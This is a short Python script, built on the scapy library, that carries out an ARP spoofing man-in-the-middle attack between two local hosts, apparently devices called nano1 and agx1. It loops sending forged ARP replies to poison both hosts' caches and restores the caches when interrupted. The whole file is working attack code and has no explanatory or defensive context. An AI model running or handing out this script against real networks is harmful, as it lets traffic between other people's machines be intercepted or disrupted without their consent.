from scapy.all import Ether, ARP, sendp, get_if_hwaddr, srp
import time
import sys

def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=2, verbose=False)
    print(ans)
    print(ans[0][1].hwsrc)
    if ans:
        return ans[0][1].hwsrc
    else:
        print(f"[!] Failed to get MAC for {ip}")
        return None

def spoof(target_ip, spoof_ip, interface, verbose=True):
    target_mac = get_mac(target_ip)
    packet = Ether(dst=target_mac, src=get_if_hwaddr(interface)) / \
             ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=interface, verbose=0)

def restore(destination_ip, source_ip, interface):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = Ether(dst=destination_mac, src=get_if_hwaddr(interface)) / \
             ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                 psrc=source_ip, hwsrc=source_mac)
    sendp(packet, count=4, iface=interface, verbose=0)

if __name__ == "__main__":
    iface = "eth0"  
    nano1_ip = "192.168.1.16"
    agx1_ip = "192.168.1.23"
    
    try:
        print("[*] Starting ARP spoofing attack")
        while True:
            spoof(nano1_ip, agx1_ip, iface)
            spoof(agx1_ip, nano1_ip, iface)
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP tables")
        restore(nano1_ip, agx1_ip, iface)
        restore(agx1_ip, nano1_ip, iface)
        sys.exit(0)


